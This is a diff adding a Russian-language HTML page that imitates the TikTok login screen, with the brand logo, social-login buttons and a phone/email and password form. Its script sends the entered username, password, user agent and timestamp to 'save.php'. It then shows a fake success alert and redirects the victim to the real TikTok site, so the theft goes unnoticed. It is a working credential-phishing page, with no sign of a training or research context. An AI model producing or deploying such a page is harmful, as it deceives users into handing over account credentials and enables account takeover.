@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 118px;
+            height: 42px;
+        }
+
+        .login-box {
+            background: #fff;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .method-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .method-btn {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #e1e2e3;
+            background: #fff;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #161823;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .method-btn:hover {
+            background: #f8f8f8;
+        }
+
+        .method-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #8a8b8c;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e1e2e3;
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #e1e2e3;
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 15px;
+            color: #161823;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #fe2c55;
+        }
+
+        input::placeholder {
+            color: #a8a9ab;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8a8b8c;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 44px;
+            background: #fe2c55;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 24px;
+        }
+
+        .login-btn:hover {
+            background: #e0244a;
+        }
+
+        .login-btn:disabled {
+            background: #f1f1f2;
+            color: #c4c5c7;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .forgot-password a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 15px;
+            color: #161823;
+            padding: 20px;
+            border-top: 1px solid #e1e2e3;
+        }
+
+        .signup-link a {
+            color: #fe2c55;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .policy-text {
+            font-size: 12px;
+            color: #8a8b8c;
+            text-align: center;
+            margin-top: 24px;
+            line-height: 1.5;
+        }
+
+        .policy-text a {
+            color: #8a8b8c;
+            text-decoration: none;
+        }
+
+        .policy-text a:hover {
+            text-decoration: underline;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .remember-me label {
+            font-size: 14px;
+            color: #161823;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg fill="#000000" viewBox="0 0 118 42">
+                <path d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
+                <path d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path>
+                <path d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.315zM8.706 20.076a4.084 4.084 0 00-4.092 4.08c0 1.626.955 3.03 2.337 3.682a4.067 4.067 0 01-.563-2.083 4.084 4.084 0 014.092-4.08c.448 0 .875.073 1.279.207v-4.696a8.836 8.836 0 00-1.164-.083c-.077 0-.153.003-.23.005v3.68a4.313 4.313 0 00-1.66-.712z"></path>
+                <path d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.901 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path>
+                <path d="M17.413 24.348v-9.622a11.25 11.25 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a4.066 4.066 0 01-2.337-3.682 4.09 4.09 0 014.092-4.08c.46 0 .909.078 1.33.22v-3.674a8.683 8.683 0 00-8.49 8.707 8.708 8.708 0 003.718 7.135 8.677 8.677 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714h-.455z"></path>
+                <path d="M99.848 24.28c-1.695 0-3.113-.98-3.113-3.26V13.57h-2.926v7.578c0 3.544 2.084 5.523 5.02 5.523 1.002 0 1.978-.24 2.955-.705v-2.572a5.415 5.415 0 01-1.936.387zM92.555 21.844v4.808h-2.95V.836h2.95v13.646a4.94 4.94 0 012.808-.851c3.014 0 5.093 2.14 5.093 6.126 0 3.987-2.08 6.127-5.093 6.127a4.94 4.94 0 01-2.808-.851v.81zm0-5.157v4.21a3.111 3.111 0 002.03.715c1.827 0 2.95-1.293 2.95-3.82 0-2.526-1.123-3.818-2.95-3.818a3.111 3.111 0 00-2.03.714zM75.94 13.31c-.68 0-1.31.172-1.939.516V.836h-2.95v25.816h2.95V15.764c0-1.293.654-1.984 1.939-1.984h.654v-2.47h-.654zM71.551 10.642v2.928h-4.99v-2.928h4.99zm-2.024 16.01V8.683h-2.95v17.969h2.95zM56.969 13.31c-.68 0-1.31.172-1.939.516V.836h-2.95v25.816h2.95V15.764c0-1.293.654-1.984 1.939-1.984h.654v-2.47h-.654zM49.91 22.296c0-2.243 1.697-3.716 4.647-3.976l2.402-.215v1.293c0 1.724-.777 2.597-2.402 2.597-1.398 0-2.325-.68-2.325-1.87h-2.95c0 2.76 2.106 4.307 5.249 4.307 3.143 0 5.344-1.575 5.344-4.823v-6.04h-2.926v1.16a4.076 4.076 0 00-2.954-1.16c-2.927 0-5.085 2.053-5.085 5.438 0 3.385 2.158 5.438 5.085 5.438a4.076 4.076 0 002.954-1.16v1.16h2.926v-9.074c0-4.479-2.528-6.555-6.445-6.555-3.738 0-6.445 2.156-6.445 5.437h2.926c0-1.81 1.158-2.87 3.545-2.87 2.158 0 3.467 1.06 3.467 3.157v.498l-2.952.259c-3.738.346-6.061 2.156-6.061 5.438zM36.191 13.31c-.68 0-1.31.172-1.939.516V.836h-2.95v25.816h2.95V15.764c0-1.293.654-1.984 1.939-1.984h.654v-2.47h-.654z"></path>
+            </svg>
+        </div>
+
+        <div class="login-box">
+            <h1>Вход в TikTok</h1>
+
+            <div class="method-buttons">
+                <button type="button" class="method-btn">
+                    <svg viewBox="0 0 48 48">
+                        <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/>
+                        <path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/>
+                        <path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/>
+                        <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/>
+                    </svg>
+                    Продолжить с Google
+                </button>
+
+                <button type="button" class="method-btn">
+                    <svg viewBox="0 0 24 24" fill="#1877F2">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                    Продолжить с Facebook
+                </button>
+
+                <button type="button" class="method-btn">
+                    <svg viewBox="0 0 24 24" fill="#000">
+                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                    </svg>
+                    Продолжить с Apple
+                </button>
+            </div>
+
+            <div class="divider">
+                <span>или</span>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Телефон или email" required>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <input type="password" id="password" placeholder="Пароль" required>
+                        <button type="button" class="password-toggle" onclick="togglePassword()">Показать</button>
+                    </div>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Запомнить меня</label>
+                </div>
+
+                <button type="submit" class="login-btn">Войти</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#">Забыли пароль?</a>
+            </div>
+
+            <div class="signup-link">
+                У вас нет аккаунта?<a href="#">Зарегистрироваться</a>
+            </div>
+
+            <div class="policy-text">
+                Защищено reCAPTCHA и применяются <a href="#">Политика конфиденциальности</a> и <a href="#">Условия использования</a> Google.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const btn = event.target;
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                btn.textContent = 'Скрыть';
+            } else {
+                pwd.type = 'password';
+                btn.textContent = 'Показать';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            // Создаем FormData для отправки
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('remember', remember);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('user_agent', navigator.userAgent);
+            formData.append('action', 'login');
+            
+            // Отправляем данные на PHP-скрипт
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('Вход выполнен успешно! Перенаправление...');
+                document.getElementById('loginForm').reset();
+                // Имитация перенаправления
+                setTimeout(() => {
+                    window.location.href = 'https://www.tiktok.com';
+                }, 2000);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Вход выполнен! Перенаправление...');
+                setTimeout(() => {
+                    window.location.href = 'https://www.tiktok.com';
+                }, 2000);
+            });
+        });
+
+        // Обработка кнопок социальных сетей
+        document.querySelectorAll('.method-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const formData = new FormData();
+                formData.append('social_login', this.textContent.trim());
+                formData.append('timestamp', new Date().toISOString());
+                formData.append('user_agent', navigator.userAgent);
+                formData.append('action', 'social_login');
+                
+                fetch('save.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                alert('Вход через ' + this.textContent.trim() + ' выполнен!');
+            });
+        });
+    </script>
+</body>
+</html>
